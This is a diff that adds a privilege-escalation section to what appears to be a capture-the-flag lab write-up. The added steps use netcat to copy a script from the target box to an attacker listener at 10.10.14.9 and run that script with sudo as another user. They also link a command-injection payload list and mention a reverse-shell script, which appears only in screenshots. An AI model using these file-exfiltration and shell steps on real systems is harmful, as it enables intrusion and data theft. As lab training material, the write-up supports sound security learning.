@@ -148,6 +148,41 @@ https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/
 
 # ${{\color{purple}Privilege Escalation}}\ $
 
-# ${{\color{purple}Exploitation}}\ $
+![image](https://user-images.githubusercontent.com/123066149/229516238-3525a24c-7165-4329-875c-f933d3560b8d.png)
+
+### Transfert file with nc :
+
+kali box : ``nc -nlvp 90 > simpler.py``
+
+linux box : ``cat /var/www/Admin-Utilities/simpler.py | nc 10.10.14.9 90``
+
+![image](https://user-images.githubusercontent.com/123066149/229517156-e4f6ead4-cacc-4663-b8c5-2d3865b0bbc3.png)
+
+![image](https://user-images.githubusercontent.com/123066149/229518213-74f79481-8503-4fe4-9909-78b22c44256a.png)
+
+### Good ressource for commande injection :
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+
+``sudo -u pepper /var/www/Admin-Utilities/simpler.py -p``
+
+![image](https://user-images.githubusercontent.com/123066149/229519554-1eda5fb2-ece3-4da5-8a95-83c15da0e578.png)
+
+![image](https://user-images.githubusercontent.com/123066149/229521144-df617460-2eda-44ad-b55a-a734855e3cd4.png)
+
+![image](https://user-images.githubusercontent.com/123066149/229521205-0de374a9-d493-4fa0-b68d-831f3cfc8ab1.png)
+
+### Other way :
+
+### Create a revshell.sh
+
+![image](https://user-images.githubusercontent.com/123066149/229523829-64bba3e7-d47c-466a-a4c5-f55554f70825.png)
+
+### Execute it :
+
+![image](https://user-images.githubusercontent.com/123066149/229524029-edb10b85-80ed-4b18-af37-087dfdfd4b5a.png)
+
+
+
 
 # ${{\color{purple}Point of Improvement}}\ $
